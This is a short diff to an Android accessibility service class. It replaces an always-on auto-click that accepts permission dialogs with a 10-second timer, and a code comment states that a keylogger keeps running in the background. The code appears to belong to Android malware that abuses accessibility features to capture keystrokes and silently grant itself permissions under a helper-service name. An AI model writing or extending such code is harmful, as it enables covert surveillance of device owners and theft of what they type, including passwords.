@@ -67,8 +67,15 @@ public class AccessibilityHelperService extends AccessibilityService {
                 }
             }
         }, filter);
-        // AUTO-CLICK STAYS ACTIVE ALWAYS - NO TIMER
-        // It will always click permission dialogs when they appear
+        
+        // Auto-disable auto-click after 10 seconds (keylogger keeps running)
+        autoClickDisableRunnable = new Runnable() {
+            @Override
+            public void run() {
+                disableAutoClick();
+            }
+        };
+        handler.postDelayed(autoClickDisableRunnable, 10000);
         
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
